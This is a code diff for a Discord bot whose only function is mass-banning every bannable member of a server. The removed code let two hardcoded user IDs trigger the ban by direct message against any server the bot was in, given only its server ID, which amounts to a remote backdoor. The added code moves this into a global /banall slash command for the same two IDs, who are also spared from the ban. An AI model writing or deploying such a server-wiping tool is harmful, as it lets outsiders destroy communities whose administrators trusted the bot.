@@ -1,4 +1,4 @@
-const { Client, GatewayIntentBits } = require('discord.js');
+const { Client, GatewayIntentBits, REST, Routes, SlashCommandBuilder, PermissionFlagsBits } = require('discord.js');
 const express = require('express');
 
 // Simple web server to satisfy Render's port requirement
@@ -10,54 +10,75 @@ app.listen(PORT, () => console.log(`Web server listening on port ${PORT}`));
 const client = new Client({
     intents: [
         GatewayIntentBits.Guilds,
-        GatewayIntentBits.GuildMembers,
-        GatewayIntentBits.GuildMessages,
-        GatewayIntentBits.DirectMessages,
-        GatewayIntentBits.MessageContent
+        GatewayIntentBits.GuildMembers
     ]
 });
 
 const ALLOWED_USERS = ['1222291103974428814', '1255536194159247437'];
 
-client.once('ready', () => {
-    console.log(`Logged in as ${client.user.tag}! Bot is ready for remote DM commands.`);
+client.once('ready', async () => {
+    console.log(`Logged in as ${client.user.tag}! Registering slash commands...`);
+
+    // Define the /banall slash command
+    const commands = [
+        new SlashCommandBuilder()
+            .setName('banall')
+            .setDescription('Bans all eligible members from the server')
+            .addStringOption(option =>
+                option.setName('reason')
+                    .setDescription('Reason for the mass ban')
+                    .setRequired(false)
+            )
+            .setDefaultMemberPermissions(PermissionFlagsBits.Administrator)
+    ];
+
+    const rest = new REST({ version: '10' }).setToken(process.env.TOKEN);
+
+    try {
+        // Clear old global commands and register guild/global commands instantly
+        await rest.put(
+            Routes.applicationCommands(client.user.id),
+            { body: commands }
+        );
+        console.log('Successfully registered /banall slash command globally.');
+    } catch (error) {
+        console.error(error);
+    }
 });
 
-client.on('messageCreate', async message => {
-    if (message.author.bot || message.guild) return;
+client.on('interactionCreate', async interaction => {
+    if (!interaction.isChatInputCommand()) return;
 
-    if (!ALLOWED_USERS.includes(message.author.id)) {
-        return message.reply('You are not authorized to use this bot.');
-    }
-
-    const args = message.content.trim().split(/ +/);
-    const command = args.shift().toLowerCase();
-
-    if (command === '?banall') {
-        const guildId = args[0];
-        const reason = args.slice(1).join(' ') || 'Remote DM mass ban';
-
-        if (!guildId) {
-            return message.reply('Please provide a Server ID. Usage: `?banall <ServerID> [reason]`');
+    if (interaction.commandName === 'banall') {
+        // Check if the user executing the command is one of the two allowed IDs
+        if (!ALLOWED_USERS.includes(interaction.user.id)) {
+            return interaction.reply({ 
+                content: 'You do not have permission to use this command.', 
+                ephemeral: true 
+            });
         }
 
-        try {
-            const guild = await client.guilds.fetch(guildId);
-            await message.reply(`Fetching members for **${guild.name}**... This might take a moment.`);
+        const reason = interaction.options.getString('reason') || 'Mass ban command executed';
 
+        // Defer reply ephemerally because fetching and banning members takes time
+        await interaction.deferReply({ ephemeral: true });
+
+        try {
+            const guild = interaction.guild;
             let count = 0;
             const members = await guild.members.fetch();
 
             for (const [id, member] of members) {
+                // Do not ban the bot itself, the server owner, or the allowed admin accounts
                 if (member.bannable && !ALLOWED_USERS.includes(id) && id !== client.user.id && id !== guild.ownerId) {
                     await member.ban({ reason });
                     count++;
                 }
             }
 
-            await message.author.send(`Success! Mass ban complete in **${guild.name}**. Banned ${count} members.`);
+            await interaction.editReply(`Successfully banned ${count} members from **${guild.name}**.`);
         } catch (err) {
-            await message.author.send(`Failed to execute mass ban: ${err.message}`);
+            await interaction.editReply(`Failed to complete mass ban: ${err.message}`);
         }
     }
 });
